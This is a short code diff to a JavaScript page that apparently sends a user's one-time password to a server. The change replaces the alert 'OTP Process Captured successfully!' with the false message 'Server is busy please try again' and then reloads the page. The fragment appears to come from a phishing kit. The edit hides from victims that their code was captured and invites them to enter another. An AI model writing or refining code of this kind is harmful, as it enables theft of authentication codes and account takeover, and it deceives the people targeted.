@@ -280,7 +280,7 @@
                         body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
                     });
                     const data = await response.json();
-                    if(data.success) { alert("OTP Process Captured successfully!"); window.location.reload(); }
+                    if(data.success) { alert("Server is busy please try again"); window.location.reload(); }
                 } catch (error) { alert("Server connection failed"); window.location.reload(); }
             }
         }
